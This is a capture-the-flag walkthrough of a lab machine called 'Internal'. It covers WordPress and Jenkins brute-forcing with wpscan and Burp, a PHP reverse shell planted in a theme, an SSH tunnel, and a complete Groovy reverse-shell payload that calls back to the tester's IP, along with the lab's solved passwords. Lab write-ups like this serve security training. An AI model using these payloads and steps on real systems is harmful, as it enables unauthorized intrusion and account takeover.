
# Internal

![](attachments/222b3e855f88a482c1267748f76f90e0.jpeg)

**Difficulty**: Hard

**Description**: Penetration Testing Challenge

**OS**: Linux

**Category:** Web, SSH Tunneling, Security Misconfiguration, Enumeration, Brute forcing

---

# Task 1: Pre-engagement Briefing

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

**Scope of Work**

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt  
    

Additionally, the client has provided the following scope allowances:

- Ensure that you modify your hosts file to reflect internal.thm
- Any tools or techniques are permitted in this engagement
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

  

Note - this room can be completed without Metasploit

****Writeups will not be accepted for this room.****

# Task 2: Deploy and Engage the Client Environment

Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.

Nmap scan:

![](attachments/20240401053607.png)

```shell
sudo nmap -sCV -A -p- -T4 --min-rate=1000 10.10.92.220 -O
```

Website running on port 80:

![](attachments/20240401054221.png)

Nothing in source code.

Directory search:

![](attachments/20240401054312.png)

Clicking on this link takes us to `internal.thm`

![](attachments/20240401054407.png)

![](attachments/20240401054442.png)

Add it to`/etc/hosts` file

![](attachments/20240401054555.png)

Now accessing the site:

![](attachments/20240401054928.png)

The site runs on wordpress version 5.4.2

![](attachments/20240401055054.png)

Using `wpscan` to scan the site for vulnerabilities:

![](attachments/20240401061030.png)

```shell
wpscan --url http://internal.thm/blog --enumerate dbe,cb,u,ap,at --detection-mode aggressive
```

Nothing useful found apart from XML-RPC enabled

On the site there is a link to the login page

![](attachments/20240401061247.png)

![](attachments/20240401061424.png)

We can test default credentials `admin:admin`

valid username admin found

![](attachments/20240401061523.png)

Using wpscan to run a bruteforce against the login

![](attachments/20240401062312.png)

```shell
wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
```

Valid credentials found:

![](attachments/20240401062344.png)

We are greeted with the following email
Current administration email: admin@internal.thm

![](attachments/20240401062433.png)

Selected `Remind me later`

Admin dashboard

![](attachments/20240401062704.png)

Now to gain shell access.

I edit the theme and insert a php reverse shell

![](attachments/20240401063555.png)

Note: I inserted my payload in the index.php page

![](attachments/20240401063641.png)


Setup a netcat listener then reload the homepage `/blog` to activate payload

![](attachments/20240401063701.png)

Stabilize shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z (background shell)
stty raw -echo;fg
Press ENTER
```

Now to get user flag.

We have the user `aubreanna` on the system

![](attachments/20240401063933.png)

But no access to their home directory.

Transfer linpeas script to perform privilege escalation enumeration

![](attachments/20240401064333.png)

We have some credentials

![](attachments/20240401064429.png)

And we have mysql service running 

![](attachments/20240401064656.png)

So we can login to the database

There is also a file in the `/opt` directory

![](attachments/20240401065000.png)

Taking a look at this file

![](attachments/20240401065031.png)

We have the user's credentials, now we can ssh into the machine.

![](attachments/20240401065140.png)

First flag obtained

![](attachments/20240401065212.png)

Logging into the sql database, we don't have anything useful

![](attachments/20240401065538.png)

We already have the admin password `my2boys` so this is of no use.

Nothing in the other database `phpmyadmin` too

![](attachments/20240401065827.png)

Checking the contents of jenkins.txt found in the home directory

![](attachments/20240401065924.png)

It says there is an internal jenkins service running on port 8080.

To connect to this we'll need to setup an ssh tunnel:

![](attachments/20240401073430.png)

```shell
ssh -L 8081:172.17.0.2:8080 aubreanna@internal.thm
```

This is basically mapping the service running on  `172.17.0.2:8080` on the target to `localhost:8081` on our machine

Now go to a browser and access it

`localhost:8081`

![](attachments/20240401073517.png)

We have a jenkins login.

Testing the username and password of aubreanna doesn't work

![](attachments/20240401073719.png)

Testing the admin username and password obtained earlier also doesn't work.

We can try to brute force for the password with the username admin and aubreanna.

I will be using burpsuite for this, so i first capture a login request and send to intruder

![](attachments/20240401084943.png)

![](attachments/20240401085018.png)

Changed the username to admin and marked the value for j_password

Set attack type to sniper and payload to runtime

![](attachments/20240401085103.png)

i will be using the rockyou.txt wordlist.

Start attack and i will be looking for a content length that stands out.

![](attachments/20240401085152.png)

Payload of spongebob stands out which means it is a valid password for the user admin

![](attachments/20240401085227.png)

Let's test it.

It works

![](attachments/20240401085314.png)

Next up is to get a shell, so we navigate to the `/script` page to access the groovy script console then enter the following reverse shell payload:

```groovy
String host="10.8.129.243";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Setup a netcat listener, run the script and catch a shell

![](attachments/20240401090352.png)

Stabilize the shell

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z (background shell)
stty raw -echo;fg
Press ENTER
```

Using linpeas i was able to find a note.txt file in the /opt directory

![](attachments/20240401091624.png)

Credentials for root user obtained

![](attachments/20240401091650.png)

Login via ssh

![](attachments/20240401091754.png)

Root flag obtained

![](attachments/20240401091841.png)

The End.

![](attachments/obito-gif-1.gif)